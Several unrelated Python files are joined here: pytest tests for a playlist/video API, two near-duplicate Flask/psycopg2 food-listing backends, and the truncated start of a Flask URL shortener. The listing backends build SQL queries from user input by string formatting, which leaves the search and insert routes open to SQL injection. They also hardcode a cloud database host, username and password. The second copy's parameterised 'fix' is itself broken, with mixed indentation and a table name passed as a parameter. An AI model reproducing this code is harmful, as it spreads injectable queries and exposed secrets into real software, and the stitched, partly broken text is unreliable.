    assert response.json['status'] == 'OK'
    assert response.json['data'] == [dict(id=1, playlist_id=1, title='f title',
                                          thumbnail='f url', position=1),
                                     dict(id=2, playlist_id=1, title='s title',
                                          thumbnail='s url', position=2),
                                     dict(id=3, playlist_id=1, title='t title',
                                          thumbnail='t url', position=3),
                                     dict(id=4, playlist_id=2, title='f title',
                                          thumbnail='f url', position=1),
                                     dict(id=5, playlist_id=2, title='fh title',
                                          thumbnail='fh url', position=2)]


def test_should_create_a_video():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response2 = test_app.post('/videos/1/title2/thumbnail2')
    assert response2.json['status'] == 'OK'

    response3 = test_app.get('/videos/1')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),
                                      dict(id=2, title='title2', thumbnail='thumbnail2', position=2)]


def test_should_update_a_video_position():
    populate_test_database()

    create_playlist('first playlist')

    create_video(1, 'title', 'thumbnail', 1)
    create_video(1, 'title2', 'thumbnail2', 2)
    create_video(1, 'title3', 'thumbnail3', 3)
    create_video(1, 'title4', 'thumbnail4', 4)

    response = test_app.put('/videos/4/1/2')
    assert response.json['status'] == 'OK'

    response2 = test_app.get('/videos/1')
    assert response2.json['status'] == 'OK'
    assert response2.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),
                                      dict(id=4, title='title4',
                                           thumbnail='thumbnail4', position=2),
                                      dict(id=2, title='title2',
                                           thumbnail='thumbnail2', position=3),
                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=4)]


def test_should_delete_a_video_given_an_id_and_update_playlist_video_position():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response2 = test_app.delete('/videos/1/1')
    assert response2.json['status'] == 'OK'

    response3 = test_app.get('/videos/1')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == []

    response4 = test_app.get('/playlists/1')

    assert response4.json['status'] == 'OK'
    assert response4.json['data'] == dict(
        id=1, name='first playlist', video_position=0)


def test_should_reorder_video_position_given_a_deleted_video():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response2 = test_app.post('/videos/1/title2/thumbnail2')
    assert response2.json['status'] == 'OK'

    response3 = test_app.post('/videos/1/title3/thumbnail3')
    assert response3.json['status'] == 'OK'

    response4 = test_app.delete('/videos/2/1')
    assert response4.json['status'] == 'OK'

    response5 = test_app.get('/videos/1')
    assert response.json['status'] == 'OK'
    assert response5.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),
                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=2)]

    response6 = test_app.get('/playlists/1')
    assert response6.json['status'] == 'OK'
    assert response6.json['data'] == dict(
        id=1, name='first playlist', video_position=2)


def test_should_return_a_not_ok_status_when_deleting_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.delete('/playlists/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_updating_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.put('/playlists/2/name')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_creating_a_video_from_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/2/title/thumbnail')

    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_updating_a_video_from_an_unknown_id():
    populate_test_database()

    response = test_app.put('/videos/1/1/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_either_specifying_an_out_of_bounds_or_similar_position():
    populate_test_database()

    create_video(1, 'title', 'thumbnail', 1)
    create_video(1, 'title2', 'thumbnail2', 2)

    response = test_app.put('/videos/1/1/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None

    response2 = test_app.put('/videos/1/1/5')
    assert response2.json['status'] == 'NOK'
    assert response2.json['message'] != None


def test_should_return_a_not_ok_status_when_deleting_a_video_from_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response = test_app.delete('/videos/1/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_deleting_a_video_not_from_a_given_playlist():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response = test_app.delete('/videos/2/1')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None



from flask import Flask
from flask import request
import simplejson as json
import psycopg2

""" Macros for relation and column names """
client_table_name = "\"Client\""
client_client_id_col = "\"ClientID\""
client_client_rating_col = "\"Client Rating\""

client_ratings_table_name = "\"Client Ratings\""
client_ratings_client_id_col = "\"ClientID\""
client_ratings_reviewer_id_col = "\"ReviewerID\""
client_ratings_comments_col = "\"Comments\""
client_ratings_rating_col = "\"Rating\""

cook_table_name = "\"Cook\""
cook_cook_id_col = "\"CookID\""
cook_cook_rating_col = "\"Cook Rating\""

cook_ratings_table_name = "\"Cook Rating\""
cook_ratings_cook_id_col = "\"CookID\""
cook_ratings_reviewer_id_col = "\"ReviewerID\""
cook_ratings_comments_col = "\"Comments\""
cook_ratings_rating_col = "\"Rating\""

listing_table_name = "\"Listing\""
listing_listing_id_col = "\"ListingID\""
listing_cook_id_col = "\"CookID\""
listing_food_name_col = "\"Food Name\""
listing_price_col = "\"Price\""
listing_location_col = "\"Location\""
listing_image_col = "\"Image\""

listing_tags_table_name = "\"Listing Tags\""
listing_tags_listing_id_col = "\"ListingID\""
listing_tags_tag_col = "\"Tag\""

order_table_name = "\"Order\""
order_client_id_col = "\"ClientID\""
order_listing_id_col = "\"ListingID\""
order_status_col = "\"Status\""
order_time_of_order_col = "\"Time of Order\""

user_table_name = "\"User\""
user_user_id_col = "\"UserID\""
user_password_col = "\"Password\""
user_fname_col = "\"FName\""
user_lname_col = "\"LName\""

""" Database login details """
db_host = "mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com"
db_name = "csc301breadwiener"
db_user = "csc301breadwiener"
db_password = "team7ithink"

conn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)
app = Flask(__name__)

##################################################
def removeQuotes(stringy):
    """ Removes the first and last characters (double quotes) from a string, and then return it """
    return stringy[1:-1]


#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#
@app.route('/api/getAllListings', methods=['GET'])
def getAllListings():
    all_rows = []

    search_all = conn.cursor()
    search_all.execute("SELECT {}, {}, {}, {},"
                         " {}, {} FROM public.{}".format(listing_listing_id_col,
                                                                          listing_cook_id_col,
                                                                          listing_food_name_col,
                                                                          listing_price_col,
                                                                          listing_location_col,
                                                                          listing_image_col,
                                                                          listing_table_name))

    single_row = search_all.fetchone()

    while single_row is not None:
        all_rows.append(single_row)
        single_row = search_all.fetchone()

    search_all.close()

    rows_to_json(all_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': all_rows})  # convert to string before returning


#--------------------------------------------------- ADD LISTING ---------------------------------------------------#

@app.route('/api/add', methods=['GET', 'POST'])
def addReq():
    if request.method == "GET":
        return printTables()
    elif request.method == "POST":
        addToDB(request.get_json())
        conn.commit()
        return "Success"

def encase_in_quotes(stringy):
    return "\"" + stringy + "\""


"""
Adds the Listing entry to the PSQL database with the given JSONdata
JSON format is a dictionary where the keys are the column names of the listing, along with
a key "tagList" which is a list of tags:

"""


def addToDB(json_data):
    cur = conn.cursor()
    json_dict = json_data

    list_id = getListId()
    cook_id = json_dict[removeQuotes(listing_cook_id_col)]
    food_name = json_dict[removeQuotes(listing_food_name_col)]
    price = json_dict[removeQuotes(listing_price_col)]
    loc = json_dict[removeQuotes(listing_location_col)]
    image = json_dict[removeQuotes(listing_image_col)]
    tags = json_dict["tags"]

    inserted = (list_id, cook_id, food_name, price, loc, image)                    
    #inserted = '(' + list_id + ',' + cook_id + ',' + food_name + ',' + price + ',' + loc + ',' + image + ')'

    sql = "INSERT INTO {} VALUES {}".format(listing_table_name, str(inserted).encode("ascii", "replace"))                    
    cur.execute(sql)                    

    addTags(tags, list_id)


def addTags(tag_list, listing_id):
    """
    Adds a list of tags tag_list for a given listing with listing_id to the database
    """
    cur = conn.cursor()
    for x in tag_list:
        sql = "INSERT INTO {} VALUES {}".format(listing_tags_table_name, str((listing_id, x)))
        cur.execute(sql)                    


def getListId():
    """ Returns an unused listing_id """
    cur = conn.cursor()
    sql = "SELECT max({}) FROM {}".format(listing_listing_id_col,
                                          listing_table_name)
    cur.execute(sql)                    
    maxID = cur.fetchone()
    if maxID[0] == None:
        return 1
    else:
        return maxID[0] + 1


def printTables():
    cur = conn.cursor()
    strout = "--------------------------ListingTable---------------------------<br>"
    sql = "SELECT * FROM {}".format(listing_table_name)
    cur.execute(sql)                    
    listings = cur.fetchall()
    for x in listings:
        for y in x:
            strout = strout + str(y) + "||	"
        strout = strout + "<br>"
    sql = "SELECT * FROM {}".format(listing_tags_table_name)
    cur.execute(sql)                    
    listings = cur.fetchall()
    strout += "<br><br><br>--------------------------TagTable-------------------------<br>"
    for x in listings:
        for y in x:
            strout = strout + str(y) + "	"

        strout = strout + "<br>"
    return strout


#--------------------------------------------------- CANCEL ---------------------------------------------------#


@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])
def cancel(clientId, listingId):
    """
    Cancels the order with specified client id and listing id and returns it.
    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already
    been canceled or fulfilled.
    """

    in_progress = get_in_progress_order(clientId, listingId)

    if in_progress:
        cancel_order(clientId, listingId)
        output = order_to_json(in_progress)  # want to convert each row into a JSON string

        return output  # convert to string before returning
    else:
        return 'order not found'


def get_in_progress_order(clientId, listingId):
    """
    Return the in progress order that corresponds with ClientId and ListingID
    """
    matched_rows = []

    order = conn.cursor()
    order.execute("SELECT t1.\"ClientID\", t1.\"ListingID\", t1.\"Status\", t1.\"Time of Order\" from public.\"Order\""
                  " as t1 WHERE t1.\"ClientID\" = " + str(clientId) + " AND \"ListingID\" = " + str(listingId) +
                  " AND t1.\"Status\" = \'In progress\'")

    order_row = order.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = order.fetchone()

    order.close()

    return matched_rows


def cancel_order(clientId, listingId):
    """
    given a clientId and listingId cancel the order in progress associated with them
    """
    order = conn.cursor()
    order.execute(
        "UPDATE public.\"Order\" SET \"Status\" = 'Canceled' WHERE \"ClientID\" = " + str(clientId) +
        " AND \"ListingID\" = " + str(listingId) + " AND \"Status\" = \'In progress\'")
    conn.commit()

    order.close()


def order_to_json(rows):
    """
    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.
    """
    string = ""
    for i in range(len(rows)):
        string += json.dumps({'ClientID': rows[i][0],
                              'ListingID': rows[i][1],
                              'Status': rows[i][2],
                              'DateTime': rows[i][3].__str__()})
        if i != len(rows) - 1:
            string += ","

    return string


#--------------------------------------------------- getUserOrders ---------------------------------------------------#


@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])
def getUserOrders(clientId):
    """
    Retruns a list of jsons representing tupples in the Orders table for the given client
    """

    in_progress = queryOrderUsingClientID(clientId)

    output = order_to_json(in_progress)  # want to convert each row into a JSON string

    return "[" + output + "]"  # convert to string before returning


def queryOrderUsingClientID(clientId):
    """
    Return a list of Order tuples belonging to the client with the given id.
    """
    matched_rows = []

    orders = conn.cursor()
    orders.execute("SELECT t1.\"ClientID\", t1.\"ListingID\", t1.\"Status\", t1.\"Time of Order\" from public.\"Order\""
                   " as t1 WHERE t1.\"ClientID\" = " + str(clientId))

    order_row = orders.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = orders.fetchone()

    orders.close()

    return matched_rows


#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#


completed = "\'Completed\'"


@app.route("/api/markComplete/<int:clientID>/<int:listingID>", methods=['GET'])
def mark_as_complete(clientID, listingID):
    """ A function that changes the status of the order with listing id listing_id to complete.
        Returns "Success" on a sucessful change of the listing id's order to complete.

        @param clientID: the client id number to change the status.
        @param listingID: the listing id number to change the status.
        @rtype: str
    """

    sql = \
        """
            UPDATE public.{}
            SET {} = {}
            WHERE {} = {} AND {} = {}
        """.format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),
                   order_client_id_col, str(clientID))

    cur = conn.cursor()
    try:
        cur.execute(sql)                    
        conn.commit()
    except Exception as e:
        raise Exception(e)

    # Check to see if a row in the database has been updated.
    if cur.rowcount == 0:
        raise Exception("The status of listing id's order was not changed. ClientID or ListingID may be out of range.")
    return "Success"


#--------------------------------------------------- SEARCH ---------------------------------------------------#


@app.route('/api/search/<string:search_query>', methods=['GET'])
def search(search_query):
    """
    Return a string representation of a list of JSON objects. This list contains
    objects that correspond to listings that match names or tags in the search query.
    """
    # separate words in search_query with '+' in place of spaces
    search_terms = search_query.split('+')

    # want to remove whitespace and empty elements from the list
    search_terms_filtered = []

    for search_term in search_terms:
        if not search_term.isspace() and not search_term == '':
            search_terms_filtered.append(search_term)

    matched_rows_by_name = get_rows_from_name(search_terms_filtered)

    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)

    matched_rows = matched_rows_by_name + matched_rows_by_tag

    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows

    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': unique_matched_rows})  # convert to string before returning


def get_rows_from_name(search_terms):
    """
    Return a list of listing tuples whose Food Names correspond to words in search_terms.
    """
    matched_rows = []

    for search_term in search_terms:
        search_names = conn.cursor()
        search_names.execute("SELECT t1.{}, t1.{}, t1.{}, t1.{},"
                             " t1.{}, t1.{} FROM public.{} as t1"
                             " FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} "
                             "WHERE UPPER(t1.{}) LIKE UPPER(\'%{}%\')".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_food_name_col,
                                                                              search_term))

        search_names_row = search_names.fetchone()

        while search_names_row is not None:
            matched_rows.append(search_names_row)
            search_names_row = search_names.fetchone()

        search_names.close()

    return matched_rows


def get_rows_from_tag(search_terms):
    """
    Return a list of listing tuples whose tags correspond to words in search_terms.
    """
    matched_rows = []

    for search_term in search_terms:
        search_tags = conn.cursor()
        search_tags.execute("SELECT t1.{}, t1.{}, t1.{}, t1.{},"
                             " t1.{}, t1.{} FROM public.{} as t1"
                             " FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} "
                             "WHERE UPPER(t2.{}) LIKE UPPER(\'%{}%\')".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_tags_tag_col,
                                                                              search_term))

        search_tags_row = search_tags.fetchone()

        while search_tags_row is not None:
            matched_rows.append(search_tags_row)
            search_tags_row = search_tags.fetchone()

        search_tags.close()

    return matched_rows


def rows_to_json(rows):
    """
    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.
    """
    for i in range(len(rows)):
        rows[i] = json.dumps({'ListingID': rows[i][0],
                                'CookID': rows[i][1],
                                'Food Name': rows[i][2],
                                'Price': rows[i][3],
                                'Location': rows[i][4],
                                'Image': rows[i][5]})


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
    # host="0.0.0.0", port=80

from flask import Flask
from flask import request
import simplejson as json
import psycopg2

""" Macros for relation and column names """
client_table_name = "\"Client\""
client_client_id_col = "\"ClientID\""
client_client_rating_col = "\"Client Rating\""

client_ratings_table_name = "\"Client Ratings\""
client_ratings_client_id_col = "\"ClientID\""
client_ratings_reviewer_id_col = "\"ReviewerID\""
client_ratings_comments_col = "\"Comments\""
client_ratings_rating_col = "\"Rating\""

cook_table_name = "\"Cook\""
cook_cook_id_col = "\"CookID\""
cook_cook_rating_col = "\"Cook Rating\""

cook_ratings_table_name = "\"Cook Rating\""
cook_ratings_cook_id_col = "\"CookID\""
cook_ratings_reviewer_id_col = "\"ReviewerID\""
cook_ratings_comments_col = "\"Comments\""
cook_ratings_rating_col = "\"Rating\""

listing_table_name = "\"Listing\""
listing_listing_id_col = "\"ListingID\""
listing_cook_id_col = "\"CookID\""
listing_food_name_col = "\"Food Name\""
listing_price_col = "\"Price\""
listing_location_col = "\"Location\""
listing_image_col = "\"Image\""

listing_tags_table_name = "\"Listing Tags\""
listing_tags_listing_id_col = "\"ListingID\""
listing_tags_tag_col = "\"Tag\""

order_table_name = "\"Order\""
order_client_id_col = "\"ClientID\""
order_listing_id_col = "\"ListingID\""
order_status_col = "\"Status\""
order_time_of_order_col = "\"Time of Order\""

user_table_name = "\"User\""
user_user_id_col = "\"UserID\""
user_password_col = "\"Password\""
user_fname_col = "\"FName\""
user_lname_col = "\"LName\""

""" Database login details """
db_host = "mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com"
db_name = "csc301breadwiener"
db_user = "csc301breadwiener"
db_password = "team7ithink"

conn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)
app = Flask(__name__)

##################################################
def removeQuotes(stringy):
    """ Removes the first and last characters (double quotes) from a string, and then return it """
    return stringy[1:-1]


#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#
@app.route('/api/getAllListings', methods=['GET'])
def getAllListings():
    all_rows = []

    search_all = conn.cursor()
    search_all.execute("SELECT {}, {}, {}, {},"
                         " {}, {} FROM public.{}".format(listing_listing_id_col,
                                                                          listing_cook_id_col,
                                                                          listing_food_name_col,
                                                                          listing_price_col,
                                                                          listing_location_col,
                                                                          listing_image_col,
                                                                          listing_table_name))

    single_row = search_all.fetchone()

    while single_row is not None:
        all_rows.append(single_row)
        single_row = search_all.fetchone()

    search_all.close()

    rows_to_json(all_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': all_rows})  # convert to string before returning


#--------------------------------------------------- ADD LISTING ---------------------------------------------------#

@app.route('/api/add', methods=['GET', 'POST'])
def addReq():
    if request.method == "GET":
        return printTables()
    elif request.method == "POST":
        addToDB(request.get_json())
        conn.commit()
        return "Success"

def encase_in_quotes(stringy):
    return "\"" + stringy + "\""


"""
Adds the Listing entry to the PSQL database with the given JSONdata
JSON format is a dictionary where the keys are the column names of the listing, along with
a key "tagList" which is a list of tags:

"""


def addToDB(json_data):
    cur = conn.cursor()
    json_dict = json_data

    list_id = getListId()
    cook_id = json_dict[removeQuotes(listing_cook_id_col)]
    food_name = json_dict[removeQuotes(listing_food_name_col)]
    price = json_dict[removeQuotes(listing_price_col)]
    loc = json_dict[removeQuotes(listing_location_col)]
    image = json_dict[removeQuotes(listing_image_col)]
    tags = json_dict["tags"]

    sql = "INSERT INTO %s VALUES (%s, %s, %s, %s, %s, %s)"
	cur.execute(sql, (listing_table_name, list_id, cook_id, food_name, price, loc, image))

    addTags(tags, list_id)


def addTags(tag_list, listing_id):
    """
    Adds a list of tags tag_list for a given listing with listing_id to the database
    """
    cur = conn.cursor()
    for x in tag_list:
        sql = "INSERT INTO {} VALUES {}".format(listing_tags_table_name, str((listing_id, x)))                    
        cur.execute(sql)                    


def getListId():
    """ Returns an unused listing_id """
    cur = conn.cursor()
    sql = "SELECT max({}) FROM {}".format(listing_listing_id_col,
                                          listing_table_name)
    cur.execute(sql)                    
    maxID = cur.fetchone()
    if maxID[0] == None:
        return 1
    else:
        return maxID[0] + 1


def printTables():
    cur = conn.cursor()
    strout = "--------------------------ListingTable---------------------------<br>"
    sql = "SELECT * FROM {}".format(listing_table_name)
    cur.execute(sql)                    
    listings = cur.fetchall()
    for x in listings:
        for y in x:
            strout = strout + str(y) + "||	"
        strout = strout + "<br>"
    sql = "SELECT * FROM {}".format(listing_tags_table_name)
    cur.execute(sql)                    
    listings = cur.fetchall()
    strout += "<br><br><br>--------------------------TagTable-------------------------<br>"
    for x in listings:
        for y in x:
            strout = strout + str(y) + "	"

        strout = strout + "<br>"
    return strout


#--------------------------------------------------- CANCEL ---------------------------------------------------#


@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])
def cancel(clientId, listingId):
    """
    Cancels the order with specified client id and listing id and returns it.
    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already
    been canceled or fulfilled.
    """

    in_progress = get_in_progress_order(clientId, listingId)

    if in_progress:
        cancel_order(clientId, listingId)
        output = order_to_json(in_progress)  # want to convert each row into a JSON string

        return output  # convert to string before returning
    else:
        return 'order not found'


def get_in_progress_order(clientId, listingId):
    """
    Return the in progress order that corresponds with ClientId and ListingID
    """
    matched_rows = []

    order = conn.cursor()
    order.execute("SELECT t1.\"ClientID\", t1.\"ListingID\", t1.\"Status\", t1.\"Time of Order\" from public.\"Order\""
                  " as t1 WHERE t1.\"ClientID\" = " + str(clientId) + " AND \"ListingID\" = " + str(listingId) +
                  " AND t1.\"Status\" = \'In progress\'")

    order_row = order.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = order.fetchone()

    order.close()

    return matched_rows


def cancel_order(clientId, listingId):
    """
    given a clientId and listingId cancel the order in progress associated with them
    """
    order = conn.cursor()
    order.execute(
        "UPDATE public.\"Order\" SET \"Status\" = 'Canceled' WHERE \"ClientID\" = " + str(clientId) +
        " AND \"ListingID\" = " + str(listingId) + " AND \"Status\" = \'In progress\'")
    conn.commit()

    order.close()


def order_to_json(rows):
    """
    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.
    """
    string = ""
    for i in range(len(rows)):
        string += json.dumps({'ClientID': rows[i][0],
                              'ListingID': rows[i][1],
                              'Status': rows[i][2],
                              'DateTime': rows[i][3].__str__()})
        if i != len(rows) - 1:
            string += ","

    return string


#--------------------------------------------------- getUserOrders ---------------------------------------------------#


@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])
def getUserOrders(clientId):
    """
    Retruns a list of jsons representing tupples in the Orders table for the given client
    """

    in_progress = queryOrderUsingClientID(clientId)

    output = order_to_json(in_progress)  # want to convert each row into a JSON string

    return "[" + output + "]"  # convert to string before returning


def queryOrderUsingClientID(clientId):
    """
    Return a list of Order tuples belonging to the client with the given id.
    """
    matched_rows = []

    orders = conn.cursor()
    orders.execute("SELECT t1.\"ClientID\", t1.\"ListingID\", t1.\"Status\", t1.\"Time of Order\" from public.\"Order\""
                   " as t1 WHERE t1.\"ClientID\" = " + str(clientId))

    order_row = orders.fetchone()

    while order_row is not None:
        matched_rows.append(order_row)
        order_row = orders.fetchone()

    orders.close()

    return matched_rows


#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#


completed = "\'Completed\'"


@app.route("/api/markComplete/<int:clientID>/<int:listingID>", methods=['GET'])
def mark_as_complete(clientID, listingID):
    """ A function that changes the status of the order with listing id listing_id to complete.
        Returns "Success" on a sucessful change of the listing id's order to complete.

        @param clientID: the client id number to change the status.
        @param listingID: the listing id number to change the status.
        @rtype: str
    """

    sql = \
        """
            UPDATE public.{}
            SET {} = {}
            WHERE {} = {} AND {} = {}
        """.format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),
                   order_client_id_col, str(clientID))

    cur = conn.cursor()
    try:
        cur.execute(sql)                    
        conn.commit()
    except Exception as e:
        raise Exception(e)

    # Check to see if a row in the database has been updated.
    if cur.rowcount == 0:
        raise Exception("The status of listing id's order was not changed. ClientID or ListingID may be out of range.")
    return "Success"


#--------------------------------------------------- SEARCH ---------------------------------------------------#


@app.route('/api/search/<string:search_query>', methods=['GET'])
def search(search_query):
    """
    Return a string representation of a list of JSON objects. This list contains
    objects that correspond to listings that match names or tags in the search query.
    """
    # separate words in search_query with '+' in place of spaces
    search_terms = search_query.split('+')

    # want to remove whitespace and empty elements from the list
    search_terms_filtered = []

    for search_term in search_terms:
        if not search_term.isspace() and not search_term == '':
            search_terms_filtered.append(search_term)

    matched_rows_by_name = get_rows_from_name(search_terms_filtered)

    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)

    matched_rows = matched_rows_by_name + matched_rows_by_tag

    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows

    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string

    return json.dumps({'data': unique_matched_rows})  # convert to string before returning


def get_rows_from_name(search_terms):
    """
    Return a list of listing tuples whose Food Names correspond to words in search_terms.
    """
    matched_rows = []

    for search_term in search_terms:
        search_names = conn.cursor()
        search_names.execute("SELECT t1.{}, t1.{}, t1.{}, t1.{},"
                             " t1.{}, t1.{} FROM public.{} as t1"
                             " FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} "
                             "WHERE UPPER(t1.{}) LIKE UPPER(\'%{}%\')".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_food_name_col,
                                                                              search_term))

        search_names_row = search_names.fetchone()

        while search_names_row is not None:
            matched_rows.append(search_names_row)
            search_names_row = search_names.fetchone()

        search_names.close()

    return matched_rows


def get_rows_from_tag(search_terms):
    """
    Return a list of listing tuples whose tags correspond to words in search_terms.
    """
    matched_rows = []

    for search_term in search_terms:
        search_tags = conn.cursor()
        search_tags.execute("SELECT t1.{}, t1.{}, t1.{}, t1.{},"
                             " t1.{}, t1.{} FROM public.{} as t1"
                             " FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} "
                             "WHERE UPPER(t2.{}) LIKE UPPER(\'%{}%\')".format(listing_listing_id_col,
                                                                              listing_cook_id_col,
                                                                              listing_food_name_col,
                                                                              listing_price_col,
                                                                              listing_location_col,
                                                                              listing_image_col,
                                                                              listing_table_name,
                                                                              listing_tags_table_name,
                                                                              listing_listing_id_col,
                                                                              listing_tags_listing_id_col,
                                                                              listing_tags_tag_col,
                                                                              search_term))

        search_tags_row = search_tags.fetchone()

        while search_tags_row is not None:
            matched_rows.append(search_tags_row)
            search_tags_row = search_tags.fetchone()

        search_tags.close()

    return matched_rows


def rows_to_json(rows):
    """
    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.
    """
    for i in range(len(rows)):
        rows[i] = json.dumps({'ListingID': rows[i][0],
                                'CookID': rows[i][1],
                                'Food Name': rows[i][2],
                                'Price': rows[i][3],
                                'Location': rows[i][4],
                                'Image': rows[i][5]})


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
    # host="0.0.0.0", port=80

#!/usr/bin/env python2.7

import sys
import os

# Flask Import
from flask import Flask , request , redirect , render_template , url_for 
from flask import jsonify , abort , make_response 
import MySQLdb

# Toekn and URL check import
from check_encode import random_token , url_check
from display_list import list_data

from sql_table import mysql_table

# Config import
import config

# Import Loggers
import logging
from logging.handlers import RotatingFileHandler
from time import strftime
import traceback

# Setting UTF-8 encoding

reload(sys)
sys.setdefaultencoding('UTF-8')
os.putenv('LANG', 'en_US.UTF-8')
os.putenv('LC_ALL', 'en_US.UTF-8')

app = Flask(__name__)
app.config.from_object('config')

shorty_host = config.domain

# MySQL configurations

host = config.host
user = config.user
passwrd = config.passwrd
db = config.db

@app.route('/analytics/<short_url>')
def analytics(short_url):

	info_fetch , counter_fetch , browser_fetch , platform_fetch = list_data(short_url)
	return render_template("data.html" , host = shorty_host,info = info_fetch ,counter = counter_fetch ,\
	 browser = browser_fetch , platform = platform_fetch)


@app.route('/' , methods=['GET' , 'POST'])
def index():

	conn = MySQLdb.connect(host , user , passwrd, db)
	cursor = conn.cursor()
	
	# Return the full table to displat on index.
	list_sql = "SELECT * FROM WEB_URL;"
	cursor.execute(list_sql)
	result_all_fetch = cursor.fetchall()

		
	if request.method == 'POST':
		og_url = request.form.get('url_input')
		custom_suff = request.form.get('url_custom')
		tag_url = request.form.get('url_tag')
		if custom_suff == '':
			token_string =  random_token()
		else:
			token_string = custom_suff
		if og_url != '':
			if url_check(og_url) == True:
				
				# Check's for existing suffix 
				check_row = "SELECT S_URL FROM WEB_URL WHERE S_URL = %s FOR UPDATE"
				cursor.execute(check_row,(token_string,))
				check_fetch = cursor.fetchone()

				if (check_fetch is None):
					insert_row = """
						INSERT INTO WEB_URL(URL , S_URL , TAG) VALUES( %s, %s , %s)
						"""
					result_cur = cursor.execute(insert_row ,(og_url , token_string , tag_url,))
					conn.commit()
					conn.close()
					e = ''
					return render_template('index.html' ,shorty_url = shorty_host+token_string , error = e )
				else:
					e = "The Custom suffix already exists . Please use another suffix or leave it blank for random suffix."
					return render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)
			else:
				e = "URL entered doesn't seem valid , Enter a valid URL."
				return render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)

		else:
			e = "Enter a URL."
			return render_template('index.html' , table = result_all_fetch, host = shorty_host,error = e)
	else:	
		e = ''
		return render_template('index.html',table = result_all_fetch ,host = shorty_host, error = e )
	
# Rerouting funciton	

@app.route('/<short_url>')
def reroute(short_url):

	conn = MySQLdb.connect(host , user , passwrd, db)
	cursor = conn.cursor()
	platform = request.user_agent.platform
	browser =  request.user_agent.browser
	counter = 1

	# Platform , Browser vars
	
